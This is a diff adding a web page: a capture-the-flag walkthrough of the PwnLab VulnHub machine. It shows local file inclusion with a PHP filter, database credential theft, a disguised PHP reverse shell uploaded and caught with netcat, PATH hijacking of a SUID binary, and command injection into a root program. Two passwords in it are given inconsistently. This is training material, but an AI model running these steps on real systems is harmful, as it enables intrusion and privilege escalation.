@@ -1,0 +1,125 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Penetration Testing in PwnLab (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-pwnlab-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-28T13:05:39+00:00">August 28, 2016</time><time class="updated" datetime="2025-06-10T20:30:43+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will walkthrough a root2boot penetration testing challenge i.e PwnLab. PwbLab is a vulnerable framework, based on the concept of CTF (capture the flag), with a bit of security which is a little complicated to bypass. But it’s not impossible. So, let us learn how we can get access.</span></p>
+<p><span style="color: #000000;">Download From <a style="color: #000000;" href="https://www.vulnhub.com/entry/pwnlab-init,158/"><strong>Here</strong></a></span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
+<li><span style="color: #000000;">Information Gathering (Nikto)</span></li>
+<li><span style="color: #000000;">Abusing config.php file (curl &amp; PHP filter convert)</span></li>
+<li><span style="color: #000000;">Obtain Mysql Database credential</span></li>
+<li><span style="color: #000000;">Extract user credential from Mysql Database</span></li>
+<li><span style="color: #000000;">Login to web application</span></li>
+<li><span style="color: #000000;">Upload webshell (PHP reverse shell)</span></li>
+<li><span style="color: #000000;">Executing Uploaded PHP backdoor (Burp suit)</span></li>
+<li><span style="color: #000000;">Netcat session</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Find SUID Binaries</span></li>
+<li><span style="color: #000000;">Privilege Escalation by Manipulating $PATH</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
+<p><span style="color: #000000;">Now to start let us, firstly, consider that we do not know the IP of the PwnLab, therefore search for the IP address beforehand and for that there is a command that shows us all the IP’s present in our network, so go to the terminal of you Kali and type :</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CAIBNgV3lew/WxAYeiCQqkI/AAAAAAAAXF4/AfN6yLhAta4qVmUX5oizfYJCxQvZ7AMpQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Target IP = 192.168.1.103</strong></span></p>
+<p><span style="color: #000000;">And to know that we start our penetration testing. So, first, we will now scan with <strong>nmap</strong>, we will apply an aggressive scan as it gives detailed information and is fast. The command is :</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.103</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rApl4kL_tgI/WxAYiHNgXRI/AAAAAAAAXGY/BFuvUAx7IUAiDIo1MXWAY1a5KJzIy1eVgCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We have the result of scanning and as you can see there are only three ports open and they are <strong>80, 111, 3306.</strong> It is our best shot but also to be sure let us check this IP on our browser. In the browser, we can see that PwnLab has three pages: <strong>home, log in and upload</strong>. To enter the server we have to upload our code into it and for we must know username and password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NPpex4gLgnE/WxAYiLp8MjI/AAAAAAAAXGc/3j4NAeGuL-MXgmUQ6Prx_19trxqV3cY9ACLcBGAs/s1600/3.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">As we need to know about username and password, we will use Nikto command to find out the file which is storing them. Nikto helps us to know all the file names and the data they are containing. And the command to for this is:</span></p>
+<pre class="lang:default decode:true">nikto -h http://192.168.1.103</pre>
+<p><span style="color: #000000;">As you can see <strong>/config.php: </strong>PHP Config file may contain database IDs and password is the file that has username and passwords. Moreover, login.php for admin login page is found.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-fVVury92Ato/WxAYiV7Or4I/AAAAAAAAXGg/kEZoydFTpiQp0hbbiNEKsDtt9xtIFJuxACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So when we open target IP on the browser and explore Login tab then it gives login form as shown below. As we were unaware of its login credential thus we try SQL injection techniques but nothing was useful now the last options was to use CURL. If you will observe the URL http://192.168.1.103/?page=login then you can count that its look like that LFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mL778jydumU/WxAYitQFzmI/AAAAAAAAXGk/akG1c3Lj48gh5iIzoHP6WjR66xxzVjpDgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">But it was not easy that much to exact information by exploiting LFI with help of ../etc/password therefore by making little bit more effort and taking help from my previous <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/">article</a> </span>we used curl command to find out the data from an inside config.php file with the help of PHP base64-encode.</span></p>
+<pre class="lang:default decode:true">curl http://192.168.1.103/index.php?page=php://filter/convert.base64-encode/resource=config</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q2AlMfHv_AY/WxAYi1_htOI/AAAAAAAAXGo/bFC_4r_qdQA07EfEuQ0ezKwaKAKAwGFkwCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">And the highlighted part of the above image is our result and has the information about username and passwords. But note that the information is in base64 code which we will have to decode in order to read it. In order to decode copy the base 64 text and follow below syntax.</span></p>
+<pre class="lang:default decode:true">echo 'base 64 encoded text' | base64 -d</pre>
+<p><span style="color: #000000;">Thus we found the following information after decoding.</span></p>
+<pre class="lang:default decode:true">$server   = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kFXlfpKJChw/WxAYjONfBwI/AAAAAAAAXGs/iSK6Mv_8vy0IYB-vOfIj80ywjngmSdAswCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">So, the username is root and password is <strong>H4u%QJ_H99.</strong></span></p>
+<p><span style="color: #000000;">Now we use MySQL command to see the username and passwords. And the SQL command is:</span></p>
+<pre class="lang:default decode:true">mysql -h 192.168.1.103 -u root -p Users</pre>
+<p><span style="color: #000000;">After typing the command it asks the password, so here enter the decoded password and press enter.</span></p>
+<pre class="lang:default decode:true">kent | Sld6WHVCSkpOeQ
+mike | U0lmZHNURW42SQ
+kane | aVN2NVltMkdSbw</pre>
+<p><span style="color: #000000;">And so, you will have the usernames and password as in this case the usernames are kent, mike, Kane with their passwords in base64 code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Dniq9WuQ68o/WxAYjcu08XI/AAAAAAAAXGw/5-jcLIWtDGAwHz0_TS8j6oVzAy8zAtcRQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">To decode each password follow the same method using echo command with -d option as shown and thus you will decode the password.</span></p>
+<pre class="lang:default decode:true">Kent: JWzXuBJJNy
+Mike: SIfdsTEn6I
+Kane:  Sv5Ym2GRo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Anp-Wz34ZD4/WxAYjmaaKRI/AAAAAAAAXG0/8_a0lumiOSof1Si1XgYOwt7HB0kXikgnQCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">By using Kane credential, we login successfully, with help of upload option we can upload any image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LNZqDUOf_6Y/WxAYevKboxI/AAAAAAAAXF0/flv9Rutw9VEdv3cvlwD8z4nUEn-1D8j4ACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Here, upload option is like a dynamic opportunity for us, because through this we can upload any backdoor file for reverse connections. We know that in Kali Linux there are several PHP backdoors among those we have used usr/share/webshell/php/php-reverse-shell. BUT you need to modify it by adding <strong>GIF98 and save as shell.gif</strong> because here you can able to upload only a file with extension GIF, png and img.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dp1gSqN7J_w/WxAYeqfqFQI/AAAAAAAAXF8/ZBdgCaWiIBYh8JR2Dvk_U_1ztFQf2mAcgCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">After changing the extension when you will try to upload the file you will succeed. Now the uploaded file must be executed at once to achieve reverse connection. Once the file is uploaded, we still need a way to execute this file. And for that right click on that file and click on <strong>copy image location</strong> option. Further, open a new terminal to <strong>start Netcat</strong> listen for the reverse connection.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PriVLOdMtLo/WxAYfkTGdgI/AAAAAAAAXGA/SidSL5eiO0wkupQgyKWUFCa18KNzBWdagCLcBGAs/s1600/13.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">Now capture its HTTP request inside burp suit or tamper data. Here its shows that the “lang” parameter is set as a cookie and might be it could use for our malicious file execution. Inside the cookie option delete whatever was written and type:</span></p>
+<pre class="lang:default decode:true">lang=../*Image location path*</pre>
+<p><span style="color: #000000;">Here,</span></p>
+<p><span style="color: #000000;">*image location path* is the path of the file that you uploaded and had copied it after that.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pJu2Yxg6h8A/WxAYgTzgEwI/AAAAAAAAXGE/Pn27QRdXbjA8UtUBc562gSXz7KULxDvwwCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Once above said changes are done then forward the intercepted request and open the terminal where netcat listener was activated here you will find the reverse connection of victim’s machine. To access proper tty shell execute below command, start penetrating more to get the flag.</span></p>
+<pre class="lang:default decode:true">python -c 'import pty; pty.spawn("/bin/bash")'
+cd /home
+ls
+su kane
+iSv5Ym2GRo</pre>
+<p><span style="color: #000000;">Here,</span></p>
+<p><span style="color: #000000;"><strong>su</strong> –&gt; denotes the switch user</span></p>
+<p><span style="color: #000000;"><strong>kane</strong> –&gt; the user you want to switch to</span></p>
+<p><span style="color: #000000;"><strong>iSv5Ym2GRo</strong> –&gt; is the password</span></p>
+<p><span style="color: #000000;">Next, if you type <strong>ls </strong>command you will that there is a folder named <strong>home</strong> in the user that we just entered. So, will go into that folder and to do so, type;</span></p>
+<pre class="lang:default decode:true">cd home
+ls
+cd kane
+ls</pre>
+<p><span style="color: #000000;">Then by using the following command, you can enumerate all binaries having SUID permission.</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">As you can see in the image below, there is a file in Kane user called <strong>msgmike. </strong> Let us try to open it and therefore, type :</span></p>
+<pre class="lang:default decode:true">./msgmike</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-BKNocrDZTks/WxAYgT6y2_I/AAAAAAAAXGI/DkiWeVmNaTE-Rkn9x6AJgbAKt-KptAcUwCLcBGAs/s1600/15.png"/></strong></span></p>
+<p><span style="color: #000000;">So we will try to run msgmike file, it put up an error message “cat: /home/mike/msg.txt No such file or directory” </span></p>
+<p><span style="color: #000000;">The most important things which should be considered here that the author has set SUID bit ON for msgmike file and might be there could be any small program file which is calling system binaries such cat to a read file from inside given path i.e. /home/mike/msg.txt  but the cat fails to find msg.txt file or directory. Taking its advantage, we will try to manipulate the environment PATH variable for cat to execute our /bin/bash command under user Mike.</span></p>
+<p><span style="color: #000000;">To do this follow the below steps:</span></p>
+<pre class="lang:default decode:true">echo $PATH
+echo '/bin/bash' &gt; cat
+chmod 777 cat
+export PATH=./:$PATH</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-a0qwBSOgqNU/WxAYgm9-lHI/AAAAAAAAXGM/XB-Z-AFe6xgP_knLAKaQ06ksQgklBUZAACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Now again run the msgmike file and you will get user Mike access. Hence above all steps was performed in direction of privilege escalation for user Mike but the root escalation is connected to phase indirectly as mike has a file msg2root which will take any Input command as the message to root.</span></p>
+<pre class="lang:default decode:true">cd mike
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-blBtzbuOC38/WxAYhOAxHBI/AAAAAAAAXGQ/K5CODJ_Bj6gNRFxzOkD4oVzfGUVnrjQKACLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">So when you will run the msg2root file, it will ask you to enter the message for root which will be considered as an input value and you can utilize this opportunity for privilege escalation as shown.</span></p>
+<pre class="lang:default decode:true">./msg2root
+test; /bin/sh
+id
+cd /root
+cat flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NsrbkNLBHVc/WxAYhtYM_BI/AAAAAAAAXGU/UKw9VnQu0vYWIDvEqvuRTTesUE-vVUnvQCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">HURRAYYYYYYYYYYYYY!! We hit the Goal and solved these challenges.</span></p>
+<p><strong>Author: </strong>Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
